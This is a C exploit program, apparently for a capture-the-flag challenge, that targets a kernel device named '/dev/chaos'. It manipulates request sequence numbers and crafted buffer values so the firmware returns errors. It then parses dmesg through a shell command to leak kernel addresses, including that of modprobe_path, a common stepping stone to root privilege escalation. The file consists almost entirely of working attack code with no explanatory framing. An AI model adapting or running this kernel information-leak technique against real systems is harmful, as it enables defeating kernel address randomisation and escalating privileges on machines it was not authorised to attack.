#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#include <chaos.h>

#define DEBUG

#ifdef DEBUG
#include <stdio.h>
#define debug(fmt, ...) fprintf(stderr, "%s:%d: %s: " fmt, __FILE__, __LINE__, __func__, __VA_ARGS__)
#else
#define debug(...)
#endif

#define CHECK(cond) do { \
  if (!(cond)) { \
    debug("check \"%s\" failed.\n", #cond); \
    _exit(2); \
  } \
} while (0)

#define OPEN() open("/dev/chaos", O_RDWR)
static uint16_t cur_seq = 0;

static inline void inc() { ++cur_seq; cur_seq %= 512; }
static inline int request(int fd, struct chaos_request *req) {
  inc();
  return ioctl(fd, CHAOS_REQUEST, req);
}

static void dummy_req_until(int seq) {
  seq %= 512;
  int fd = OPEN();
  CHECK(ioctl(fd, CHAOS_ALLOCATE_BUFFER, 0x100000 - 0x3000 - 0x1000) == 0);
  struct chaos_request req;
  while (cur_seq != seq)
    CHECK(request(fd, &req) == -1);
  close(fd);
}

static uint32_t lastmsg(void) {
  system("dmesg | grep 'fw returns an error:' | tail -1 | awk '{ print $NF }'> /tmp/t");
  int x;
  FILE *f = fopen("/tmp/t", "r");
  CHECK(f);
  CHECK(fscanf(f, "%d", &x) == 1);
  return x;
}
static void leak() {
  int fd = OPEN();
  CHECK(ioctl(fd, CHAOS_ALLOCATE_BUFFER, 0x1000) == 0);
  uint64_t *buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  CHECK(buf != MAP_FAILED);
  struct chaos_request req = {
    .algo = 100,
    .input = 0x0,
    .in_size = 0x4,
  };
  dummy_req_until(0xfd90 - 1);
  buf[0] = 0x555555555554a4e0ull;
  request(fd, &req);
  if (errno != EPROTO) { debug("leak failed :(%s\n", strerror(errno)); exit(1); }
  uint64_t val = lastmsg();
  val = (val << 16) | (0xffffull << 48);
  val += 0x50000;
  debug("expect cmdq @ 0x%lx\n", val);
  dummy_req_until(0xa88 - 1);
  buf[0] = 0x2aaaaaaaaaa9f9b4ull;
  request(fd, &req);
  if (errno != EPROTO) { debug("leak failed :(%s\n", strerror(errno)); while(1); exit(1); }
  val = lastmsg();
  val = (val << 16) | (0xffffull << 48);
  val += 0x1021220;
  debug("expect modprobe_path @ 0x%lx\n", val);
  close(fd);
  munmap(buf, 0x1000);
}

int main() {
  leak();
  while (1);
  return 0;
}
